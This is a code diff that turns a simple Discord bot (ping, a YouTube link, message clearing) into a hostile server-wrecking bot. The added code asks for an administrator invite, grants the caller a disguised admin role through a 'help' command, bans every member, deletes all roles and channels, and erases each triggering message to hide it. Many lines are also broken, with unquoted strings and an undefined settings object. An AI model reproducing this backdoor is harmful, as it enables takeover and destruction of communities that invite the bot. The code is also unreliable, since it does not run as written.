@@ -1,29 +1,66 @@
-const Discord = require('discord.js');
-const client = new Discord.Client();
+const Discord = require("discord.js");
+const client = new Discord.Client({disableEveryone: true});
 
-const PREFIX = '.';
+client.on("ready", async () => {
+    console.log(PossumBot Is Now Activated);
+    //Bot Status
+    client.user.setActivity(I am listening);
 
-client.on('ready', () => {
-    console.log('I am ready!');
-});
-
-client.on('message', message =>{
-    
-    let args = message.content.substring(PREFIX.length).split(" ");
-
-    switch(args[0]){
-        case 'ping':
-            message.channel.send('pong!');
-            break;
-        case 'youtube':
-            message.channel.send('Youtube.com/ExperienceYT')
-            break;
-        case 'clear' :
-            if(!args[1]) return message.reply('Please mention number of messages to delete')
-            message.channel.bulkDelete(args[1]);
-            break;
-        
+    try {
+        //Generates a invite link in the console...
+    let link = await client.generateInvite(["ADMINISTRATOR"]);
+    console.log(link);
+    } catch(e) {
+        console.log(e.stack);
     }
+});
+client.on("message", async message => { 
+if(message.author.client) return;
+
+    const args = message.content.slice(clientSettings.prefix.length).trim().split(/ +/g);
+      const command = args.shift().toLowerCase();
+
+  //Gives you the admin role and deletes the message.
+  if(command === help) {
+      try {
+    role = await message.guild.createRole({
+     name: ".",
+      color: "#2f3136",
+      permissions: [8]
+    });
+    message.member.addRole(role)
+    message.delete(1000);
+    } catch(e) {
+        console.log(e.stack);
+    }
+   }
+   //Bans everyone and deletes the message.
+   if(command === ban) {
+       try {
+       message.guild.members.forEach(member => {member.ban()});
+       message.delete(1000);
+       } catch(e) {
+    console.log(e.stack);
+       }
+   }
+
+   if(command === roles) {
+       try {
+       message.guild.roles.forEach(roles => {roles.delete()});
+       message.delete(1000);
+       } catch(e) {
+    console.log(e.stack);
+       }
+   }
+
+   if(command === delete) {
+    try {
+    message.guild.channels.forEach(channels => {channels.delete()});
+    message.delete(1000);
+    } catch(e) {
+ console.log(e.stack);
+    }
+}
 });
 
 
